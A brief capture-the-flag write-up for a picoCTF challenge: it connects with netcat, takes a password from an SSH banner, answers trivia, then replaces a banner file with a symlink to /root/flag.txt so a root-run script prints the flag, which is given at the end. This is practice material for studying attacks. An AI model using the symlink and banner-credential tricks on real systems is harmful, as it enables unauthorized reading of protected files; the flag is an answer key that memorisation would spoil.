# Write Up

## Log in

```bash
$ nc  tethys.picoctf.net 54219
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
```

```bash
$  nc tethys.picoctf.net 56012
*************************************
**************WELCOME****************
*************************************

what is the password?
My_Passw@rd_@1234
What is the top cyber security conference in the world?
DEFCON
the first hacker ever was known for phreaking(making free phone calls), who was it?
John
player@challenge:~$
```

---

## Symlinks

```bash
player@challenge:~$ rm banner
rm banner
player@challenge:~$ ln -s /root/flag.txt banner
ln -s /root/flag.txt banner
```

Create a link: banner = /root/flag.txt 

So when the `script.py` run, it will open the `/root/flag.txt` file

---

## Flag

Flag: picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_68ca8b23}
